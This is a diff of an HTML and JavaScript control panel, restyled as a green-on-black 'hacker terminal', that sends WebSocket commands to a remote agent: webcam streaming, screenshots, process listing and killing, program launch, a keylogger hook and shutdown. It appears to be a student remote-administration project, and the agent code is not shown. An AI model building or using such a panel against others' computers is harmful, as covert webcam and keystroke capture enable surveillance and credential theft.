@@ -2,121 +2,249 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Remote Control - Final</title>
+    <title>REMOTE_OPS // TERMINAL</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
     <style>
-        body { font-family: 'Segoe UI', Consolas, sans-serif; background: #f4f6f8; padding: 20px; color: #333; }
-        .container { max-width: 1100px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
-        
-        /* Header Styles */
-        .header { display: flex; gap: 10px; border-bottom: 2px solid #333; padding-bottom: 15px; margin-bottom: 20px; align-items: center; }
-        .status { font-weight: bold; margin-left: auto; }
-        .status.connected { color: #28a745; } .status.disconnected { color: #dc3545; }
+        /* --- CORE TERMINAL STYLES --- */
+        :root {
+            --bg-color: #0a0a0a;     /* Nền đen sâu */
+            --panel-bg: #0e1114;     /* Nền panel tối */
+            --text-primary: #00ff41; /* Xanh lá hacker cổ điển */
+            --text-accent: #00f7ff;  /* Xanh dương điện tử (Cyan) cho tiêu đề/điểm nhấn */
+            --danger: #ff003c;       /* Đỏ cảnh báo sắc nét */
+            --border-glow: 0 0 4px rgba(0, 255, 65, 0.3);
+        }
 
-        /* Grid & Panels */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .panel { border: 1px solid #e1e4e8; padding: 15px; background: #fafbfc; border-radius: 5px; }
+        body {
+            font-family: 'Fira Code', 'Roboto Mono', Consolas, monospace; /* Font đơn sắc là bắt buộc */
+            background: var(--bg-color);
+            color: var(--text-primary);
+            margin: 0;
+            padding: 20px;
+            /* Hiệu ứng nền vân scanline nhẹ */
+            background-image: linear-gradient(rgba(0, 20, 0, 0.9), rgba(0, 20, 0, 0.9)), url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAEUlEQVQYV2NkoAAwMvz/z4AKAL8XAwWjT3L5AAAAAElFTkSuQmCC');
+            background-size: cover, 4px 4px;
+        }
+
+        /* Container chính với viền phát sáng */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(14, 17, 20, 0.95); /* Bán trong suốt */
+            padding: 25px;
+            border: 1px solid var(--text-primary);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.15);
+            position: relative;
+        }
+        /* Trang trí góc container */
+        .container::before { content: ""; position: absolute; top: -2px; left: -2px; width: 20px; height: 20px; border-top: 2px solid var(--text-accent); border-left: 2px solid var(--text-accent); }
+        .container::after { content: ""; position: absolute; bottom: -2px; right: -2px; width: 20px; height: 20px; border-bottom: 2px solid var(--text-accent); border-right: 2px solid var(--text-accent); }
+
+
+        /* --- Header & Status --- */
+        .header {
+            display: flex; gap: 15px;
+            border-bottom: 2px solid var(--text-primary);
+            padding-bottom: 20px; margin-bottom: 25px;
+            align-items: center; letter-spacing: 1px;
+        }
+        .status { font-weight: 700; margin-left: auto; padding: 4px 8px; border: 1px solid currentColor; }
+        .status.connected { color: var(--text-primary); box-shadow: inset 0 0 8px var(--text-primary); }
+        .status.disconnected { color: var(--danger); box-shadow: inset 0 0 8px var(--danger); animation: blink-red 1s infinite; }
+
+        /* --- Grid & Panels --- */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
         .full { grid-column: span 2; }
-        h3 { margin-top: 0; border-bottom: 1px solid #eaecef; padding-bottom: 8px; color: #0366d6; font-size: 16px; }
-
-        /* Inputs & Buttons */
-        input { padding: 6px; border: 1px solid #ccc; border-radius: 4px; }
-        button { padding: 6px 12px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: 600; transition: 0.2s; margin-right: 5px; }
-        button:hover { opacity: 0.9; }
-        .btn-blue { background: #007bff; } .btn-red { background: #dc3545; } 
-        .btn-green { background: #28a745; } .btn-gray { background: #6c757d; }
-
-        /* Tables & Logs */
-        .scroll-box { height: 200px; overflow-y: auto; margin-top: 10px; border: 1px solid #ddd; background: white; }
-        table { width: 100%; border-collapse: collapse; font-size: 12px; }
-        th, td { border: 1px solid #ddd; padding: 6px; text-align: left; }
-        th { background: #f6f8fa; position: sticky; top: 0; }
-        tr:hover { background-color: #f1f1f1; }
         
-        textarea { width: 100%; height: 80px; background: #24292e; color: #00ff00; border: none; padding: 5px; font-family: monospace; resize: vertical; box-sizing: border-box; }
-        #sys-log { height: 120px; background: #1b1f23; color: #f1f8ff; overflow-y: auto; font-size: 11px; padding: 8px; margin-top: 20px; font-family: monospace; border-radius: 4px; }
+        .panel {
+            border: 1px solid #333;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            position: relative;
+            transition: border-color 0.3s;
+        }
+        .panel:hover { border-color: var(--text-accent); }
+        
+        h3 {
+            margin-top: 0;
+            border-bottom: 1px dashed #333;
+            padding-bottom: 10px;
+            color: var(--text-accent);
+            font-size: 18px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+        /* Thêm tiền tố '>_' cho tiêu đề */
+        h3::before { content: ">_ "; color: var(--text-primary); }
 
-        /* Media */
-        img.view-area { display: block; max-width: 100%; max-height: 350px; margin: 10px auto; border: 1px solid #ccc; background: #000; }
+        /* --- Inputs & Buttons (Terminal Style) --- */
+        input[type="text"], input[type="number"] {
+            padding: 8px;
+            background: #000;
+            border: 1px solid var(--text-primary);
+            color: var(--text-primary);
+            font-family: inherit;
+            outline: none;
+        }
+        input:focus { border-color: var(--text-accent); box-shadow: 0 0 5px var(--text-accent); }
+
+        button {
+            padding: 8px 15px; cursor: pointer;
+            background: transparent; /* Nền trong suốt */
+            border: 1px solid currentColor; /* Viền theo màu chữ */
+            color: var(--text-primary);
+            font-family: inherit; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 1px;
+            transition: all 0.2s;
+            margin-right: 5px;
+            position: relative; overflow: hidden;
+        }
+        /* Hiệu ứng hover đảo màu */
+        button:hover { background: var(--text-primary); color: #000; box-shadow: 0 0 10px var(--text-primary); }
+        
+        /* Các nút màu đặc biệt */
+        .btn-blue { color: var(--text-accent); }
+        .btn-blue:hover { background: var(--text-accent); color: #000; box-shadow: 0 0 10px var(--text-accent); }
+        .btn-red { color: var(--danger); }
+        .btn-red:hover { background: var(--danger); color: #fff; box-shadow: 0 0 10px var(--danger); }
+        .btn-green { color: var(--text-primary); }
+        .btn-gray { color: #888; border-color: #888; }
+        .btn-gray:hover { background: #888; color: #000; }
+
+        /* --- Tables & Logs (Data Grid) --- */
+        .scroll-box {
+            height: 220px; overflow-y: auto; margin-top: 15px;
+            border: 1px solid #333; background: #050505;
+        }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th, td { border: 1px solid #222; padding: 8px; text-align: left; color: #bbb; }
+        th { background: #111; position: sticky; top: 0; color: var(--text-accent); border-bottom: 1px solid var(--text-accent); }
+        tr:hover td { color: var(--text-primary); background: rgba(0, 255, 65, 0.05); }
+        
+        textarea, #sys-log {
+            width: 100%; background: #050505;
+            color: var(--text-primary); border: 1px solid #333;
+            padding: 10px; font-family: inherit; box-sizing: border-box;
+        }
+        textarea { height: 90px; resize: vertical; }
+        textarea:focus { border-color: var(--text-primary); }
+        
+        #sys-log {
+            height: 150px; overflow-y: auto; font-size: 12px;
+            margin-top: 25px; border-top: 2px solid var(--text-accent);
+        }
+        #sys-log div { padding: 2px 0; border-bottom: 1px dotted #222; }
+        /* Hiệu ứng nhấp nháy cho dòng log cuối cùng */
+        #sys-log div:last-child::after { content: "_"; animation: blink 1s infinite; }
+
+        /* --- Media Views --- */
+        .view-area-container { border: 1px solid var(--text-primary); padding: 5px; display: inline-block; background: #000; }
+        img.view-area {
+            display: block; max-width: 100%; max-height: 350px;
+            border: 1px solid #222; background: #0a0a0a;
+            /* Hiệu ứng nhiễu nhẹ khi không có tín hiệu */
+            min-height: 200px; min-width: 300px;
+            background-image: repeating-linear-gradient(0deg, #0a0a0a, #0a0a0a 2px, #111 2px, #111 4px);
+        }
+
+        /* --- Animations --- */
+        @keyframes blink { 50% { opacity: 0; } }
+        @keyframes blink-red { 50% { opacity: 0.5; box-shadow: none; } }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <b>IP Server:</b> <input type="text" id="ip" value="ws://localhost:9010">
-        <button class="btn-blue" onclick="connect()">🔌 Connect</button>
-        <span id="status" class="status disconnected">DISCONNECTED</span>
+        <label for="ip" style="color: var(--text-accent); font-weight: bold;">[TARGET_IP]:></label> 
+        <input type="text" id="ip" value="ws://localhost:9010" style="width: 200px;">
+        <button class="btn-blue" onclick="connect()">[⚡ ESTABLISH_LINK]</button>
+        <span id="status" class="status disconnected">OFFLINE</span>
     </div>
 
     <div class="grid">
         <div class="panel full">
-            <h3>📹 Webcam Stream (Realtime Binary)</h3>
-            <button class="btn-green" onclick="send('WEBCAM', 'START_STREAM')">▶ Start Stream</button>
-            <button class="btn-red" onclick="send('WEBCAM', 'STOP_STREAM')">⏹ Stop Stream</button>
-            <img id="cam-stream" class="view-area" alt="Webcam Stream Off">
+            <h3>📹 SURVEILLANCE_FEED [Webcam]</h3>
+            <div style="margin-bottom: 15px;">
+                <button class="btn-green" onclick="send('WEBCAM', 'START_STREAM')">▶ ACTIVATE FEED</button>
+                <button class="btn-red" onclick="send('WEBCAM', 'STOP_STREAM')">■ TERMINATE FEED</button>
+            </div>
+            <div class="view-area-container" style="width: 100%; text-align: center;">
+                <img id="cam-stream" class="view-area" style="margin: 0 auto;" alt="> NO SIGNAL <">
+            </div>
         </div>
 
-<div class="panel">
-            <h3>⚙️ Process Manager</h3>
-            <div style="margin-bottom: 8px; border-bottom: 1px dashed #ccc; padding-bottom: 5px;">
-                <input type="text" id="proc-path" placeholder="Ex: notepad.exe" style="width: 120px;">
-                <button class="btn-green" onclick="startProcess()">🚀 Start New</button>
+        <div class="panel">
+            <h3>⚙️ ACTIVE_PROCESSES</h3>
+            <div style="margin-bottom: 12px; border-bottom: 1px dashed #333; padding-bottom: 10px;">
+                <input type="text" id="proc-path" placeholder="ex: cmd.exe" style="width: 140px;">
+                <button class="btn-green" onclick="startProcess()">> EXECUTE</button>
             </div>
             
-            <div style="margin-bottom: 8px;">
-                <button class="btn-blue" onclick="send('PROCESS', 'LIST')">🔄 Refresh List</button>
-                <input type="number" id="proc-pid" placeholder="PID" style="width: 70px;">
-                <button class="btn-red" onclick="killProcess()">☠️ Kill PID</button>
+            <div style="margin-bottom: 12px;">
+                <button class="btn-blue" onclick="send('PROCESS', 'LIST')">↻ REFRESH_LIST</button>
+                <input type="number" id="proc-pid" placeholder="PID" style="width: 80px;">
+                <button class="btn-red" onclick="killProcess()">X KILL_PID</button>
             </div>
 
             <div class="scroll-box">
                 <table id="proc-table">
-                    <thead><tr><th>PID</th><th>Name</th><th>Threads</th><th>Act</th></tr></thead>
+                    <thead><tr><th>PID</th><th>IMAGE_NAME</th><th>THRDS</th><th>ACT</th></tr></thead>
                     <tbody></tbody>
                 </table>
             </div>
         </div>
 
         <div class="panel">
-            <h3>📦 App Manager</h3>
-            <div style="margin-bottom: 8px;">
-                <button class="btn-blue" onclick="send('APP', 'LIST')">🔄 Refresh</button>
-                <input type="text" id="app-path" placeholder="Notepad" style="width: 80px;">
-                <button class="btn-green" onclick="startApp()">🚀 Start</button>
+            <h3>📦 REGISTERED_APPLICATIONS</h3>
+            <div style="margin-bottom: 12px;">
+                <button class="btn-blue" onclick="send('APP', 'LIST')">↻ SCAN_APPS</button>
+                <input type="text" id="app-path" placeholder="App Name" style="width: 100px;">
+                <button class="btn-green" onclick="startApp()">> LAUNCH</button>
             </div>
             <div class="scroll-box">
                 <table id="app-table">
-                    <thead><tr><th>Name</th><th>Action</th></tr></thead>
+                    <thead><tr><th>EXECUTABLE</th><th>ACTION</th></tr></thead>
                     <tbody></tbody>
                 </table>
             </div>
         </div>
 
         <div class="panel">
-            <h3>📸 Screenshot (Binary Fast)</h3>
-            <button class="btn-green" onclick="captureScreen()">📷 Capture Screen</button>
-            <img id="screen-img" class="view-area" style="max-height: 150px;" alt="Screenshot Area">
+            <h3>📸 DESKTOP_SNAPSHOT</h3>
+            <button class="btn-green" onclick="captureScreen()" style="width: 100%; margin-bottom: 10px;">[ CAPTURE_FRAME ]</button>
+            <div class="view-area-container" style="width: 100%;">
+                <img id="screen-img" class="view-area" style="max-height: 180px; width: 100%;" alt="> NO DATA <">
+            </div>
         </div>
 
         <div class="panel">
-            <h3>⌨️ Keylogger</h3>
-            <button class="btn-red" onclick="send('KEYBOARD', 'START')">Start Hook</button>
-            <button class="btn-gray" onclick="send('KEYBOARD', 'STOP')">Stop Hook</button>
-            <button class="btn-blue" onclick="document.getElementById('keylog-out').value=''">Clear</button>
-            <textarea id="keylog-out"></textarea>
+            <h3>⌨️ KEYSTROKE_INTERCEPT</h3>
+            <div style="margin-bottom: 10px;">
+                <button class="btn-red" onclick="send('KEYBOARD', 'START')">● REC</button>
+                <button class="btn-gray" onclick="send('KEYBOARD', 'STOP')">■ STOP</button>
+                <button class="btn-blue" onclick="document.getElementById('keylog-out').value=''">_CLEAR</button>
+            </div>
+            <textarea id="keylog-out" placeholder="> Waiting for input stream..."></textarea>
         </div>
         
-        <div class="panel full">
-            <h3>🖥️ System Power</h3>
-            <button class="btn-red" onclick="if(confirm('Shutdown?')) send('SYSTEM', 'SHUTDOWN')">🛑 Shutdown</button>
-            <button class="btn-gray" onclick="if(confirm('Restart?')) send('SYSTEM', 'RESTART')">🔄 Restart</button>
+        <div class="panel full" style="border-color: var(--danger);">
+            <h3 style="color: var(--danger);">🖥️ SYSTEM_POWER_OPS [DANGER ZONE]</h3>
+            <button class="btn-red" onclick="if(confirm('Confirm SYSTEM HALT?')) send('SYSTEM', 'SHUTDOWN')">🛑 INITIATE_SHUTDOWN</button>
+            <button class="btn-gray" onclick="if(confirm('Confirm SYSTEM REBOOT?')) send('SYSTEM', 'RESTART')">🔄 INITIATE_RESTART</button>
         </div>
     </div>
 
-    <div id="sys-log"></div>
+    <div id="sys-log">
+        <div>>_ SYSTEM READY. Waiting for connection target...</div>
+    </div>
 </div>
 
 <script>
+    // ... (Copy toàn bộ nội dung thẻ <script> từ code cũ của em vào đây, không cần sửa gì) ...
     let ws = null;
     const logDiv = document.getElementById('sys-log');
     
@@ -137,13 +265,13 @@
 
         ws.onopen = () => {
             document.getElementById('status').className = "status connected";
-            document.getElementById('status').innerText = "CONNECTED";
-            log("✅ WebSocket Connected");
+            document.getElementById('status').innerText = "ONLINE"; // Sửa text một chút cho ngầu
+            log("✅ >>> CONNECTION ESTABLISHED <<<");
         };
         ws.onclose = () => {
             document.getElementById('status').className = "status disconnected";
-            document.getElementById('status').innerText = "DISCONNECTED";
-            log("❌ WebSocket Disconnected");
+            document.getElementById('status').innerText = "OFFLINE";
+            log("❌ >>> CONNECTION LOST <<<");
         };
 
         ws.onmessage = (event) => {
@@ -153,7 +281,7 @@
                     // Nếu đang đợi Screenshot -> Hiển thị vào khung Screenshot
                     renderImage('screen-img', event.data);
                     isWaitingForScreenshot = false; // Reset cờ
-                    log("📸 Screenshot binary received");
+                    log("📸 > Screenshot frame received.");
                 } else {
                     // Mặc định là Stream Webcam
                     renderImage('cam-stream', event.data);
@@ -187,9 +315,10 @@
 
     // --- GỬI LỆNH ---
     function send(module, command, payload = {}) {
-        if (!ws || ws.readyState !== 1) { alert("Check connection!"); return; }
+        if (!ws || ws.readyState !== 1) { alert(">>> ERROR: NO CARRIER (Check connection) <<<"); return; }
         const msg = { module, command, payload };
         ws.send(JSON.stringify(msg));
+        log(`> SENDING: [${module}::${command}]`);
     }
 
     // --- UI ACTIONS ---
@@ -219,7 +348,7 @@
 
     // --- XỬ LÝ JSON RESPONSE ---
     function handleResponse(res) {
-        if (res.status === 'error') { log("⛔ " + res.message); return; }
+        if (res.status === 'error') { log("⛔ ERROR: " + res.message); return; }
 
         // PROCESS LIST
         if (res.module === 'PROCESS' && res.command === 'LIST') {
@@ -237,10 +366,11 @@
                 btn.innerText = "X";
                 btn.className = "btn-red";
                 btn.style.padding = "2px 6px";
+                btn.style.border = "none"; btn.style.background = "var(--danger)"; btn.style.color = "black"; // Ghi đè style nút X trong bảng cho gọn
                 btn.onclick = () => { document.getElementById('proc-pid').value = p.pid; };
                 row.insertCell().appendChild(btn);
             });
-            log(`Loaded ${list.length} processes`);
+            log(`> Process list updated: ${list.length} entries.`);
         }
 
         // APP LIST
@@ -251,11 +381,12 @@
                 const row = tbody.insertRow();
                 row.insertCell().innerText = app.exe;
                 const btn = document.createElement('button');
-                btn.innerText = "Kill"; 
+                btn.innerText = "KILL"; 
                 btn.className = "btn-red"; btn.style.fontSize = "10px";
                 btn.onclick = () => send('APP', 'KILL', { name: app.exe });
                 row.insertCell().appendChild(btn);
             });
+            log(`> App list updated.`);
         }
 
         // KEYLOGGER
@@ -268,7 +399,7 @@
         }
         
         else {
-            log(`ℹ️ [${res.module}] ${res.message || 'OK'}`);
+            log(`ℹ️ [${res.module}] ACK: ${res.message || 'OK'}`);
         }
     }
 </script>
